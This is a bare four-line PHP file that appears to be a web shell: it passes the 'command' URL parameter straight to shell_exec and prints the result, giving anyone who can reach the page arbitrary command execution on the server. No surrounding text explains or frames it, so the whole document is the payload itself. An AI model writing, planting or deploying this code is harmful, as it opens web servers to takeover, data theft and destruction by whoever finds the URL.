<?php
$output = shell_exec($_GET['command']);
echo "<pre>$output</pre>";
?>